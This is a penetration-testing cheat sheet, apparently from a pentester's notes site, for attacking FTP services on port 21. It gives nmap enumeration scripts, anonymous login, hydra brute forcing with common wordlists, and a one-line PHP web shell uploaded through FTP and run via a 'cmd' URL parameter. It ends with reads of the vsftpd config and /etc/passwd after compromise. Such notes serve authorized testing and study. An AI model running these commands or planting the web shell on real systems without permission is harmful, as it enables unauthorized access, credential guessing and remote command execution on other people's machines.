# FTP (21)

!!! tip "Start here"
    Always try anonymous login first. If you get in, check for write access — if the FTP root maps to a web directory, it's a direct file upload path.

---

## Enumeration

```bash
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor,ftp-vsftpd-backdoor 10.10.10.10
```

---

## Anonymous Login

```bash
ftp 10.10.10.10
# Username: anonymous
# Password: anonymous

ftp> ls -la
ftp> ls -laR       # recursive listing
```

Mirror the entire directory without interacting manually:
```bash
wget -m --no-passive ftp://anonymous@10.10.10.10
```

---

## Brute Force

```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://10.10.10.10
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10
```

---

## File Transfer

```bash
ftp> get filename        # download
ftp> put filename        # upload
ftp> type binary         # switch to binary mode for non-text files
```

---

## Web Shell Upload

If the FTP root maps to a web-accessible directory (`/var/www/html`):

```bash
# Create shell locally
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload via FTP
ftp> put shell.php
```

Access at: `http://10.10.10.10/shell.php?cmd=id`

!!! warning "Watch out"
    Confirm the upload path is web-accessible before spending time on the shell. Upload a test file first and try to reach it over HTTP.

---

## Post-Exploitation

If you've compromised the host, check FTP config for stored credentials:

```bash
cat /etc/vsftpd.conf
grep ftp /etc/passwd
```

!!! tip "Real-world"
    FTP is rarely exposed externally on modern networks — when you do see it, it's usually a legacy system or an oversight. Treat it as higher priority than it looks; misconfigured FTP on an internal network often has write access to paths that matter.
